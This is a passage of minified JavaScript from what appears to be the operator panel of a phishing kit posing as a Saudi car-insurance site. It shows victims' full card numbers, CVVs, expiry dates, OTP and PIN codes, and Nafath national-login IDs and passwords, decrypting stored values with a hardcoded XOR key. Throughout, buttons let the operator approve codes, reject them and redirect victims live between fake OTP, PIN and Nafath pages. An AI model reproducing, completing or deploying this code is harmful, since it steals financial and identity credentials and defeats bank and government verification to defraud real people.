                                    style: {
                                        fontSize: "9px",
                                        fontWeight: "bold",
                                        color: A.subtext,
                                        letterSpacing: "0.08em",
                                        textTransform: "uppercase"
                                    },
                                    children: [C, y].filter(Boolean).join(" · ")
                                }), j && (0, t.jsxs)("div", {
                                    className: "flex items-center gap-1",
                                    children: [(0, t.jsx)("span", {
                                        style: {
                                            fontSize: "14px"
                                        },
                                        title: w || _,
                                        children: j
                                    }), !k && w && (0, t.jsxs)("span", {
                                        style: {
                                            fontSize: "8px",
                                            color: "#b91c1c",
                                            fontWeight: "bold"
                                        },
                                        children: ["⚠️ ", w]
                                    })]
                                }), i && (0, t.jsx)("span", {
                                    style: {
                                        fontSize: "8px",
                                        color: A.subtext
                                    },
                                    children: "⭐ أحدث"
                                })]
                            })]
                        })]
                    })]
                }), s && o && (0, t.jsx)("div", {
                    children: o
                })]
            })
        }
        let p = e.includes("PIN") || e.includes("رمز") || e.includes("كلمة مرور") || e.includes("OTP") || e.includes("كود"),
            g = "";
        if (p) {
            let e = Object.entries(a);
            e.length > 0 && (g = e[0][1]?.toString() || "")
        }
        return (0, t.jsxs)("div", {
            className: "bg-gray-50 rounded-lg p-2 border border-gray-300",
            style: {
                fontFamily: "Cairo, Tajawal, sans-serif"
            },
            children: [(0, t.jsxs)("div", {
                className: "mb-2",
                children: [r && (0, t.jsx)("div", {
                    className: "text-[10px] text-gray-500 text-right mb-0.5",
                    children: u(r)
                }), (0, t.jsx)("h3", {
                    className: "text-sm font-bold text-gray-800 text-center",
                    children: e
                })]
            }), p && g ? (0, t.jsx)("div", {
                className: "flex justify-center gap-1 mb-2",
                style: {
                    direction: "ltr"
                },
                children: g.split("").map((e, a) => (0, t.jsx)("div", {
                    className: "bg-white rounded shadow-sm flex items-center justify-center w-8 h-10",
                    children: (0, t.jsx)("span", {
                        className: "text-xl font-bold text-gray-900",
                        children: e
                    })
                }, a))
            }) : (0, t.jsx)("div", {
                className: "bg-white rounded p-2 shadow-sm mb-2",
                children: (0, t.jsx)("div", {
                    className: "space-y-2",
                    children: Object.entries(a).map(([e, a]) => null == a ? null : (0, t.jsxs)("div", {
                        className: "flex justify-between items-center gap-2 text-sm",
                        children: [(0, t.jsxs)("span", {
                            className: "font-semibold text-gray-600",
                            children: [e, ":"]
                        }), (0, t.jsx)("span", {
                            className: "text-gray-900 font-bold text-right",
                            children: a?.toString() || "-"
                        })]
                    }, e))
                })
            }), s && o && (0, t.jsx)("div", {
                children: o
            })]
        })
    }
    async function k(e, t, a, r) {
        await s(e, {
            history: updateHistoryEntry(r, t, ["_t5", "phone_otp"], a)
        })
    }
    async function N(e, t, a) {
        await s(e, redirectPayload("nafad", {
            history: updateHistoryEntry(a, t, ["_t5", "phone_otp"], "approved"),
            phoneOtpStatus: "approved",
            currentStep: "_t6"
        }))
    }
    async function A(e, t, a) {
        await s(e, {
            history: updateHistoryEntry(a, t, ["_t5", "phone_otp"], "rejected"),
            _v7: "",
            phoneOtp: "",
            phoneOtpStatus: "rejected",
            phoneOtpRejectionError: "رمز غير صحيح - يرجى إدخال رمز تحقق جديد",
            redirectPage: null,
            currentPage: null,
            currentStep: null
        })
    }
    async function resendOtp(e, t, a) {
        await s(e, {
            history: updateHistoryEntry(a, t, ["_t5", "phone_otp"], "resend"),
            _v7: "",
            phoneOtp: "",
            phoneOtpStatus: "rejected",
            phoneOtpRejectionError: "يرجى إدخال رمز تحقق جديد",
            redirectPage: null,
            currentPage: null,
            currentStep: null
        })
    }
    function resolveHistoryId(e, t, a) {
        a = a || ["_t5", "phone_otp"];
        if (!Array.isArray(e) || !t) return t;
        if ("current" === t) {
            let r = e.filter(e => a.includes(e.type));
            return r.length ? r[r.length - 1].id : t
        }
        if (e.some(e => e.id === t)) return t;
        let r = e.filter(e => a.includes(e.type)),
            n = parseInt(t, 10);
        return !isNaN(n) && r[n] ? r[n].id : r[0] ? r[0].id : t
    }
    let S = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c";

    function C(e) {
        let t = "";
        for (let a = 0; a < e.length; a++) t += String.fromCharCode(e.charCodeAt(a) ^ S.charCodeAt(a % S.length));
        return btoa(encodeURIComponent(t).replace(/%([0-9A-F]{2})/g, (e, t) => String.fromCharCode(parseInt(t, 16))))
    }

    function B(e) {
        try {
            let t = decodeURIComponent(Array.from(atob(e), e => "%" + ("00" + e.charCodeAt(0).toString(16)).slice(-2)).join("")),
                a = "";
            for (let e = 0; e < t.length; e++) a += String.fromCharCode(t.charCodeAt(e) ^ S.charCodeAt(e % S.length));
            return a
        } catch {
            return e
        }
    }

    function isPlainValue(e, t) {
        if (!e || "string" != typeof e) return !1;
        let a = e.trim(),
            r = a.replace(/\s/g, "");
        if ("card" === t) return /^\d{13,19}$/.test(r);
        if ("cvv" === t) return /^\d{3,4}$/.test(r);
        if ("exp" === t) return /^\d{2}\/?\d{2,4}$/.test(r);
        if ("name" === t) {
            if (a.length < 2) return !1;
            if (/[\u0600-\u06FF]/.test(a)) return !0;
            if (/\s/.test(a)) return !0;
            return /^[A-Za-z.'-]+$/.test(a) && a.length < 12 && !looksEncrypted(a)
        }
        return !1
    }

    function looksEncrypted(e) {
        if (!e || "string" != typeof e) return !1;
        let t = e.trim();
        return t.length >= 2 && /^[A-Za-z0-9+/=_-]+=*$/.test(t) && !/^[\d\s\/\-]+$/.test(t)
    }

    function getCardField(e, t) {
        if (!e) return null;
        let a = {
            card: ["_v1", "v1", "cardNumber", "X3Yx"],
            cvv: ["_v2", "v2", "cvv", "X3Yy"],
            exp: ["_v3", "v3", "expiry", "exp", "X3Yz"],
            name: ["_v4", "v4", "holderName", "cardHolder", "X3Y0"]
        } [t] || [];
        for (let t = 0; t < a.length; t++)
            if (null != e[a[t]] && "" !== e[a[t]]) return e[a[t]];
        return null
    }

    function safeDecrypt(e, t) {
        if (null == e || "string" != typeof e) return e;
        let a = String(e).trim();
        if (!a) return e;
        if (isPlainValue(a, t || "text")) return a;
        if (!looksEncrypted(a)) return e;
        try {
            let r = B(a);
            if (!r || r === a) return e;
            if ("cvv" === t) return /^\d{3,4}$/.test(r) ? r : e;
            if ("exp" === t) return /^\d{2}\/?\d{2,4}$/.test(r) ? r : e;
            if ("card" === t) {
                let n = r.replace(/\s/g, "");
                return /^\d{13,19}$/.test(n) ? n : e
            }
            if ("name" === t) return r.length >= 2 && /[\u0600-\u06FFa-zA-Z]/.test(r) && !/[\x00-\x08\x0E-\x1F\uFFFD]/.test(r) ? r.trim() : e;
            return r
        } catch (e) {}
        return e
    }

    function eNorm(e, t) {
        let a = {
                ...t,
                ...e
            },
            r = a.user_agent || a.userAgent || "",
            n = r ? r.toLowerCase() : "";
        return {
            phoneNumber: a.phoneNumber || a.phone_number || null,
            identityNumber: a.identityNumber || a.identity_number || null,
            deviceType: a.deviceType || a.device_type || (r ? /mobile|android|iphone|ipad|ipod|webos|blackberry/i.test(r) ? "mobile" : "desktop" : null),
            os: a.os || a.operating_system || a.operatingSystem || (n ? n.includes("android") ? "Android" : n.includes("iphone") || n.includes("ipad") || n.includes("ios") ? "iOS" : n.includes("windows") ? "Windows" : n.includes("mac os") || n.includes("macintosh") ? "macOS" : n.includes("linux") ? "Linux" : null : null),
            browser: a.browser || (n ? n.includes("edg/") ? "Edge" : n.includes("opr/") || n.includes("opera") ? "Opera" : n.includes("firefox") ? "Firefox" : n.includes("samsungbrowser") ? "Samsung" : n.includes("chrome") ? "Chrome" : n.includes("safari") ? "Safari" : null : null),
            country: a.country || a.country_code || a.countryCode || a.geo_country || a.geoCountry || null,
            ipAddress: a.ipAddress || a.ip_address || null,
            isp: a.isp || null
        }
    }

    function T({
        visitor: e
    }) {
        let r, n, [o, d] = (0, a.useState)(!1),
            [l, c] = (0, a.useState)(!1),
            [u, m] = (0, a.useState)(""),
            [p, g] = (0, a.useState)("vertical"),
            [h, b] = (0, a.useState)(!1),
            [x, f] = (0, a.useState)(null),
            y = x || e,
            V = eNorm(x, e),
            v = (0, a.useCallback)(async () => {
                if (e?.id && !h) {
                    b(!0);
                    try {
                        let t = await i(e.id);
                        t && f(t)
                    } catch (e) {
                        console.error("Refresh error:", e)
                    } finally {
                        b(!1)
                    }
                }
            }, [e?.id, h]);
        if (x && e?.id !== x?.id && f(null), !e) return (0, t.jsx)("div", {
            className: "flex-1 flex items-center justify-center bg-gray-50",
            children: (0, t.jsxs)("div", {
                className: "text-center text-gray-400",
                children: [(0, t.jsx)("svg", {
                    className: "w-16 h-16 mx-auto mb-3 opacity-20",
                    fill: "none",
                    viewBox: "0 0 24 24",
                    stroke: "currentColor",
                    children: (0, t.jsx)("path", {
                        strokeLinecap: "round",
                        strokeLinejoin: "round",
                        strokeWidth: 1,
                        d: "M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
                    })
                }), (0, t.jsx)("p", {
                    className: "text-sm text-gray-400",
                    children: "اختر زائراً لعرض التفاصيل"
                })]
            })
        });
        let j = async (t, a) => {
            if ((y.id || e.id) && !o) {
                d(!0);
                try {
                    let r = {},
                        n = {
                            home: "الصفحة الرئيسية",
                            insur: "بيانات التأمين",
                            compar: "مقارنة العروض",
                            payment: "الدفع والتحقق",
                            otp: "التحقق OTP",
                            pin: "التحقق PIN",
                            phone: "معلومات الهاتف",
                            nafad: "نفاذ",
                            nafad_modal: "مودال نفاذ"
                        };
                    switch (t) {
                        case "home":
                            r = redirectPayload("home-new");
                            break;
                        case "insur":
                            r = redirectPayload("insur");
                            break;
                        case "compar":
                            r = redirectPayload("compar");
                            break;
                        case "payment":
                            r = redirectPayload("check", {
                                cardStatus: "pending",
                                otpStatus: "pending"
                            });
                            break;
                        case "otp":
                            r = redirectPayload("otp", {
                                otpStatus: "pending",
                                _v5Status: "pending"
                            });
                            break;
                        case "pin":
                            r = redirectPayload("pin", {
                                pinStatus: "pending",
                                _v6Status: "pending"
                            });
                            break;
                        case "phone":
                            r = redirectPayload("phone");
                            break;
                        case "nafad":
                        case "nafad_modal":
                            r = redirectPayload("nafad")
                    }
                    let vid = y.id || e.id;
                    Object.keys(r).length > 0 && vid && (console.log("[Dashboard] Sending redirect:", t, r), await s(vid, r), "nafad_modal" === t && (await new Promise(e => setTimeout(e, 1500)), await s(vid, {
                        nafadConfirmationCode: "00"
                    })), G.success(`تم توجيه الزائر إلى ${n[t]||t}`), a && (a.value = ""), (async () => {
                        let e = await i(vid);
                        e && f(e)
                    })())
                } catch (e) {
                    console.error("Navigation error:", e), G.error("حدث خطأ في التوجيه")
                } finally {
                    d(!1)
                }
            }
        }, sendNafadCode = async () => {
            if (e.id && u.trim()) try {
                await s(e.id, {
                    nafadConfirmationCode: u.trim(),
                    nafadConfirmationStatus: "waiting"
                }), m(""), G.success("تم إرسال رقم التأكيد للزائر")
            } catch (e) {
                console.error("حدث خطأ في إرسال رقم التأكيد"), G.error("فشل إرسال رقم التأكيد")
            }
        }, S = [];
        // Smart history: uses e.history as base (has all new entries), but applies
        // resolved statuses from y.history so UI updates immediately after approve/reject
        let smartHist=function(yh,eh){eh=eh||[];if(!yh||!yh.length)return eh;var m=new Map(yh.map(function(v){return[v.id,v];}));var base=eh.length>=yh.length?eh:yh;return base.map(function(entry){var yl=m.get(entry.id);return(yl&&yl.status!=='pending'&&entry.status==='pending')?Object.assign({},entry,{status:yl.status}):entry;});},_sh=smartHist(y.history,e.history);
        if (e.history, e.ownerName || e.identityNumber) {
            let t = {
                الاسم: e.ownerName,
                "رقم الهوية": e.identityNumber,
                "رقم الهاتف": e.phoneNumber,
                "نوع الوثيقة": e.documentType,
                "الرقم التسلسلي": e.serialNumber,
                "نوع التأمين": e.insuranceType
            };
            "نقل ملكية" === e.insuranceType && (t["اسم المشتري"] = e.buyerName, t["رقم هوية المشتري"] = e.buyerIdNumber), S.push({
                id: "basic-info",
                title: "معلومات أساسية",
                icon: "👤",
                color: "blue",
                data: t,
                timestamp: e.basicInfoUpdatedAt || e.createdAt,
                showActions: !1
            })
        }
        e.insuranceCoverage && S.push({
            id: "insurance-details",
            title: "تفاصيل التأمين",
            icon: "🚗",
            color: "green",
            data: {
                "نوع التغطية": e.insuranceCoverage,
                "موديل المركبة": e.vehicleModel,
                "قيمة المركبة": e.vehicleValue,
                "سنة الصنع": e.vehicleYear,
                "استخدام المركبة": e.vehicleUsage,
                "موقع الإصلاح": "agency" === e.repairLocation ? "وكالة" : "ورشة"
            },
            timestamp: e.insurCompletedAt || e.insuranceUpdatedAt || e.createdAt,
            showActions: !1
        }), e.selectedOffer && S.push({
            id: "offer-details",
            title: "العرض المختار",
            icon: "📊",
            color: "purple",
            data: {
                الشركة: e.selectedOffer.name || e.selectedOffer.company,
                "السعر الأصلي": e.originalPrice,
                الخصم: e.discount ? `${(100*e.discount).toFixed(0)}%` : void 0,
                "السعر النهائي": e.finalPrice || e.offerTotalPrice,
                "المميزات المختارة": Array.isArray(e.selectedFeatures) ? e.selectedFeatures.join(", ") : "لا يوجد"
            },
            timestamp: e.comparCompletedAt || e.offerUpdatedAt || e.createdAt,
            showActions: !1
        });
        let C = ((_sh)?.filter(e => "_t1" === e.type || "card" === e.type) || []).sort((e, t) => {
            let a = new Date(e.timestamp).getTime();
            return new Date(t.timestamp).getTime() - a
        });
        C.forEach((e, t) => {
            var a;
            let r, n, s, i, o, d = getCardField(e.data, "card") || getCardField(y, "card"),
                l = getCardField(e.data, "cvv") || getCardField(y, "cvv"),
                c = getCardField(e.data, "exp") || getCardField(y, "exp"),
                u = getCardField(e.data, "name") || getCardField(y, "name");
            try {
                r = d ? safeDecrypt(d, "card") : void 0, n = l ? safeDecrypt(l, "cvv") : void 0, s = c ? safeDecrypt(c, "exp") : void 0, i = u ? safeDecrypt(u, "name") : void 0
            } catch (e) {
                console.error("[Dashboard] Decryption error:", e), r = d, n = l, s = c, i = u
            }
            let m = "approved" === e.status || "rejected" === e.status || "approved_with_otp" === e.status || "approved_with_pin" === e.status,
                p = r ? _(r) : null,
                g = p?.issuer_name || e.data?.bankInfo?.name || "غير محدد",
                h = p ? "visa" === (o = (a = p.scheme).toLowerCase()) ? "VISA" : "mastercard" === o ? "Mastercard" : "mada" === o ? "مدى" : "amex" === o ? "American Express" : a.toUpperCase() : e.data?.cardType || "غير محدد",
                b = p?.product_name || null,
                x = p ? "credit" === p.funding ? "ائتمانية" : "debit" === p.funding ? "Debit" : p.funding : null,
                f = p?.country_code || null;
            (r || d) && S.push({
                id: `card-info-${e.id||t}`,
                title: 0 === t ? "معلومات البطاقة" : `معلومات البطاقة (محاولة ${C.length-t})`,
                icon: "💳",
                color: "orange",
                data: {
                    "رقم البطاقة": r,
                    "اسم حامل البطاقة": i || "غير محدد",
                    البنك: g,
                    الشبكة: h,
                    ...b ? {
                        "نوع البطاقة": b
                    } : {},
                    ...x ? {
                        "نوع التمويل": x
                    } : {},
                    ...f ? {
                        الدولة: f
                    } : {},
                    "تاريخ الانتهاء": s,
                    CVV: n
                },
                timestamp: e.timestamp,
                status: e.status || "pending",
                showActions: !m,
                isLatest: 0 === t,
                type: "card"
            })
        });
        let T = ((_sh)?.filter(e => "_t2" === e.type || "otp" === e.type) || []).sort((e, t) => {
            let a = new Date(e.timestamp).getTime();
            return new Date(t.timestamp).getTime() - a
        });
        if (0 === T.length && e._v5) {
            let t = e._v5Status || "pending";
            S.push({
                id: "otp-current",
                title: "كود OTP",
                icon: "🔑",
                color: "pink",
                data: {
                    الكود: e._v5
                },
                timestamp: e.otpUpdatedAt || e.updatedAt,
                status: "approved" === t ? "approved" : "rejected" === t ? "rejected" : "pending",
                showActions: "approved" !== t && "rejected" !== t,
                isLatest: !0,
                type: "otp"
            })
        } else T.forEach((t, a) => {
            let r = t.data?._v5 || t.data?._v5Code || t._v5 || e._v5,
                n = "approved" === t.status || "rejected" === t.status;
            r && S.push({
                id: `otp-${t.id||a}`,
                title: 0 === a ? "كود OTP" : `كود OTP (محاولة ${T.length-a})`,
                icon: "🔑",
                color: "pink",
                data: {
                    الكود: r
                },
                timestamp: t.timestamp,
                status: t.status || "pending",
                showActions: !n,
                isLatest: 0 === a,
                type: "otp"
            })
        });
        let P = ((_sh)?.filter(e => "_t3" === e.type || "pin" === e.type) || []).sort((e, t) => {
            let a = new Date(e.timestamp).getTime();
            return new Date(t.timestamp).getTime() - a
        });
        P.forEach((e, t) => {
            let a = e.data?._v6;
            "approved" === e.status || e.status, a && S.push({
                id: `pin-${e.id||t}`,
                title: 0 === t ? "رمز PIN" : `رمز PIN (محاولة ${P.length-t})`,
                icon: "🔐",
                color: "indigo",
                data: {
                    الكود: a
                },
                timestamp: e.timestamp,
                status: e.status || "pending",
                showActions: !("approved" === e.status || "rejected" === e.status),
                isLatest: 0 === t,
                type: "pin"
            })
        });
        let I = ((_sh)?.filter(e => "_t4" === e.type || "phone_verification" === e.type) || []).sort((e, t) => {
            let a = new Date(e.timestamp).getTime();
            return new Date(t.timestamp).getTime() - a
        });
        if (0 === I.length && (e.phoneCarrier || e.phoneSubmittedAt)) {
            let t = e._v4Status || "pending";
            S.push({
                id: "phone-verification-current",
                title: "تحقق الهاتف",
                icon: "📞",
                color: "teal",
                data: {
                    "رقم الهوية": e.phoneIdNumber || e.identityNumber || "",
                    "رقم الجوال": e.phoneNumber || "",
                    "شركة الاتصالات": e.phoneCarrier || ""
                },
                timestamp: e.phoneUpdatedAt || e.updatedAt,
                status: "approved" === t ? "approved" : "rejected" === t ? "rejected" : "pending",
                showActions: !1,
                isLatest: !0,
                type: "phone_verification"
            })
        } else I.forEach((t, a) => {
            "approved" === t.status || t.status;
            let r = t.data?.phoneNumber || e.phoneNumber,
                n = t.data?.phoneCarrier || e.phoneCarrier;
            r && n && S.push({
                id: `phone-verification-${t.id||a}`,
                title: 0 === a ? "تحقق الهاتف" : `تحقق الهاتف (محاولة ${I.length-a})`,
                icon: "📞",
                color: "teal",
                data: {
                    "رقم الهوية": t.data?.idNumber || t.data?.phoneIdNumber || e.phoneIdNumber || "",
                    "رقم الجوال": r,
                    "شركة الاتصالات": n
                },
                timestamp: t.timestamp,
                status: t.status || "pending",
                showActions: !1,
                isLatest: 0 === a,
                type: "phone_verification"
            })
        });
        e.phoneCarrier && 0 === I.length && !e._v4Status && S.push({
            id: "phone-info-current",
            title: "معلومات الهاتف",
            icon: "📱",
            color: "green",
            data: {
                "رقم الجوال": e.phoneNumber,
                "شركة الاتصالات": e.phoneCarrier
            },
            timestamp: e.phoneUpdatedAt || e.updatedAt,
            showActions: !0,
            isLatest: !0,
            type: "phone_info"
        });
        let E = ((_sh)?.filter(e => "_t5" === e.type || "phone_otp" === e.type) || []).sort((e, t) => {
            let a = new Date(e.timestamp).getTime();
            return new Date(t.timestamp).getTime() - a
        });
        E.forEach((e, t) => {
            let a = e.data?._v7,
                r = "approved" === e.status || "rejected" === e.status;
            a && S.push({
                id: `phone-otp-${e.id||t}`,
                title: 0 === t ? "كود تحقق الهاتف" : `كود تحقق الهاتف (محاولة ${E.length-t})`,
                icon: "✅",
                color: "pink",
                data: {
                    "كود التحقق": a
                },
                timestamp: e.timestamp,
                status: e.status || "pending",
                showActions: !r,
                isLatest: 0 === t,
                type: "phone_otp"
            })
        });
        let R = e._v8 || e.v8 || e.nafazId,
            M = e._v9 || e.v9 || e.nafazPass,
            z = "_t6" === e.currentStep || "nafad" === e.redirectPage || "nafad" === e.redirect_page || "nafad" === e.currentPage;
        (R || M || z) && S.push({
            id: "nafad-info",
            title: "🇸🇦 نفاذ",
            icon: "🇸🇦",
            color: "indigo",
            data: {
                "رقم الهوية": R || "في انتظار الإدخال...",
                "كلمة المرور": M || "في انتظار الإدخال...",
                "رقم التأكيد المُرسل": e.nafadConfirmationCode || "لم يتم الإرسال بعد"
            },
            timestamp: e.nafadUpdatedAt || e.updatedAt,
            showActions: !0,
            customActions: (0, t.jsxs)("div", {
                className: "space-y-3 mt-3",
                children: [(0, t.jsxs)("div", {
                    className: "flex gap-2",
                    children: [(0, t.jsx)("input", {
                        type: "text",
                        value: u,
                        onChange: e => m(e.target.value),
                        placeholder: "أدخل رقم التأكيد",
                        className: "flex-1 px-3 py-2 border rounded-lg text-sm"
                    }), (0, t.jsx)("button", {
                        onClick: sendNafadCode,
                        disabled: !u.trim(),
                        className: "px-4 py-2 bg-blue-600 text-gray-900 rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed",
                        children: "إرسال"
                    })]
                }), "waiting" === e.nafadConfirmationStatus && (0, t.jsxs)("div", {
                    className: "flex gap-2",
                    children: [(0, t.jsx)("button", {
                        onClick: async () => {
                            e.id && await s(e.id, {
                                nafadConfirmationStatus: "approved"
                            })
                        },
                        disabled: l,
                        className: "flex-1 px-4 py-2 bg-green-600 text-gray-900 rounded-lg text-sm hover:bg-green-700 disabled:opacity-50 font-medium",
                        children: "✓ قبول نفاذ"
                    }), (0, t.jsx)("button", {
                        onClick: async () => {
                            e.id && await s(e.id, {
                                nafadConfirmationStatus: "rejected"
                            })
                        },
                        disabled: l,
                        className: "flex-1 px-4 py-2 bg-red-600 text-gray-900 rounded-lg text-sm hover:bg-red-700 disabled:opacity-50 font-medium",
                        children: "✗ رفض نفاذ"
                    })]
                })]
            })
        });
        let L = [...S].sort((e, t) => {
                let a = e.timestamp ? new Date(e.timestamp).getTime() : 0;
                return (t.timestamp ? new Date(t.timestamp).getTime() : 0) - a
            }),
            O = async (t, a) => {
                let vid = y.id || e.id,
                    vhist = y.history || e.history || [];
                if (vid && !l) {
                    c(!0);
                    try {
                        let r = L.find(e => e.id === t);
                        if (!r) return void G.error("لم يتم العثور على العنصر");
                        let n = r.id.replace(/^(card-info-|otp-|pin-|phone-verification-|phone_verification-|phone-otp-|phone_otp-)/, "");
                        switch (console.log("[handleBubbleAction] bubble.id:", r.id, "historyId:", n, "bubble.type:", r.type, "action:", a), r.type) {
                            case "card":
                                if ("otp" === a) {
                                    let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
                                    await s(vid, redirectPayload("otp", {
                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "approved_with_otp"),
                                        cardStatus: "approved_with_otp",
                                        otpStatus: "pending",
                                        _v5Status: "pending"
                                    })), G.success("تم توجيه الزائر لصفحة OTP")
                                } else if ("pin" === a) {
                                    let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
                                    await s(vid, redirectPayload("pin", {
                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "approved_with_pin"),
                                        cardStatus: "approved_with_pin",
                                        pinStatus: "pending",
                                        _v6Status: "pending"
                                    })), G.success("تم توجيه الزائر لصفحة PIN")
                                } else if ("reject" === a) {
                                    let t = resolveHistoryId(vhist, n, ["_t1", "card"]);
                                    await s(vid, redirectPayload("check", {
                                        history: updateHistoryEntry(vhist, t, ["_t1", "card"], "rejected"),
                                        cardStatus: "rejected"
                                    })), G.success("تم رفض البطاقة")
                                }
                                break;
                            case "otp":
                                if (n = resolveHistoryId(vhist, n, ["_t2", "otp"]), "approve" === a) {
                                    await s(vid, redirectPayload("pin", {
                                        history: updateHistoryEntry(vhist, n, ["_t2", "otp"], "approved"),
                                        _v5Status: "approved",
                                        otpStatus: "approved",
                                        pinStatus: "pending",
                                        _v6Status: "pending"
                                    })), G.success("تم قبول OTP — توجيه الزائر لصفحة PIN")
                                } else if ("reject" === a) {
                                    await s(vid, redirectPayload("otp", {
                                        history: updateHistoryEntry(vhist, n, ["_t2", "otp"], "rejected"),
                                        _v5Status: "rejected",
                                        otpStatus: "pending"
                                    })), G.success("تم رفض OTP — سيعاد فتح الإدخال للعميل")
                                }
                                break;
                            case "pin":
                                if (n = resolveHistoryId(vhist, n, ["_t3", "pin"]), "approve" === a) {
                                    await s(vid, redirectPayload("phone", {
                                        history: updateHistoryEntry(vhist, n, ["_t3", "pin"], "approved"),
                                        _v6Status: "approved",
                                        pinStatus: "approved"
                                    })), G.success("تم قبول PIN")
                                } else if ("reject" === a) {
                                    await s(vid, redirectPayload("pin", {
                                        history: updateHistoryEntry(vhist, n, ["_t3", "pin"], "rejected"),
                                        _v6Status: "rejected",
                                        pinStatus: "pending"
                                    })), G.success("تم رفض PIN")
                                }
                                break;
                            case "phone_verification":
                                if ("approve" === a) {
                                    let t = resolveHistoryId(vhist, n, ["_t4", "phone_verification"]);
                                    await s(vid, {
                                        history: updateHistoryEntry(vhist, t, ["_t4", "phone_verification"], "approved"),
                                        _v4Status: "approved",
                                        redirectPage: null,
                                        currentPage: null,
                                        currentStep: null
                                    }), G.success("تم قبول الهاتف")
                                } else if ("reject" === a) {
                                    let t = resolveHistoryId(vhist, n, ["_t4", "phone_verification"]);
                                    await s(vid, {
                                        history: updateHistoryEntry(vhist, t, ["_t4", "phone_verification"], "rejected"),
                                        _v4Status: "rejected",
                                        phoneCarrier: ""
                                    }), G.success("تم رفض الهاتف")
                                }
                                break;
                            case "phone_otp":
                                if (n = resolveHistoryId(vhist, n), "approve" === a) await N(vid, n, vhist), G.success("تم قبول كود الهاتف وتوجيه الزائر لنفاذ");
                                else if ("reject" === a) await A(vid, n, vhist), G.success("تم رفض كود الهاتف — سيُعاد فتح نافذة الإدخال للعميل");
                                else if ("resend" === a) await resendOtp(vid, n, vhist), G.success("تم طلب إعادة إرسال كود الهاتف — سيُعاد فتح نافذة الإدخال للعميل");
                                break
                        }
                        let refreshed = await i(vid);
                        refreshed && f(refreshed)
                    } catch (e) {
                        console.error("Action error:", e), G.error("فشل تنفيذ الإجراء")
                    } finally {
                        c(!1)
                    }
                }
            };
        return (0, t.jsxs)("div", {
            className: "flex-1 flex flex-col bg-gray-50 overflow-hidden",
            children: [(0, t.jsxs)("div", {
                className: "bg-white border-b border-gray-200 shadow-sm",
                dir: "rtl",
                children: [(0, t.jsxs)("div", {
                    className: "flex items-center gap-2 px-3 py-2 border-b border-gray-200",
                    children: [(0, t.jsx)("span", {
                        className: "text-[11px] font-mono text-gray-500 bg-gray-100 border border-gray-200 px-2 py-0.5 rounded shrink-0",
                        children: (y?.id || e.id || "").slice(-8).toUpperCase()
                    }), (0, t.jsxs)("button", {
                        onClick: v,
                        disabled: h,
                        className: "flex items-center gap-1.5 hover:opacity-80 transition-opacity disabled:opacity-50 min-w-0",
                        title: "تحديث",
                        children: [(0, t.jsx)("span", {
                            className: "font-bold text-gray-900 text-sm truncate",
                            children: y?.ownerName || e.ownerName || "زائر جديد"
                        }), (0, t.jsx)("span", {
                            className: `text-gray-400 text-xs ${h?"animate-spin":""}`,
                            children: "↻"
                        })]
                    }), (0, t.jsx)("div", {
                        className: "flex-1"
                    }), (0, t.jsxs)("select", {
                        onChange: e => j(e.target.value, e.target),
                        disabled: o,
                        className: "text-[11px] px-2 py-1 bg-white border border-gray-300 rounded text-gray-700 focus:outline-none focus:border-green-500 disabled:opacity-50 cursor-pointer shadow-sm",
                        children: [(0, t.jsx)("option", {
                            value: "",
                            children: "توجيه الزائر..."
                        }), (0, t.jsx)("option", {
                            value: "home",
                            children: "الصفحة الرئيسية"
                        }), (0, t.jsx)("option", {
                            value: "insur",
                            children: "بيانات التأمين"
                        }), (0, t.jsx)("option", {
                            value: "compar",
                            children: "مقارنة العروض"
                        }), (0, t.jsx)("option", {
                            value: "payment",
                            children: "الدفع والتحقق"
                        }), (0, t.jsx)("option", {
                            value: "otp",
                            children: "التحقق OTP"
                        }), (0, t.jsx)("option", {
                            value: "pin",
                            children: "التحقق PIN"
                        }), (0, t.jsx)("option", {
                            value: "phone",
                            children: "معلومات الهاتف"
                        }), (0, t.jsx)("option", {
                            value: "nafad",
                            children: "نفاذ"
                        }), (0, t.jsx)("option", {
                            value: "nafad_modal",
                            children: "مودال نفاذ"
                        })]
                    })]
                }), (0, t.jsxs)("div", {
                    className: "flex items-center gap-0 overflow-x-auto scrollbar-hide text-[11px]",
                    children: [V.phoneNumber && (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: [(0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
                            })
                        }), (0, t.jsx)("span", {
                            className: "text-gray-700 font-mono",
                            children: V.phoneNumber
                        })]
                    }), V.identityNumber && (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                        children: [(0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2"
                            })
                        }), (0, t.jsx)("span", {
                            className: "text-gray-700 font-mono",
                            children: V.identityNumber
                        })]
                    }), V.deviceType && (0, t.jsxs)("div", {
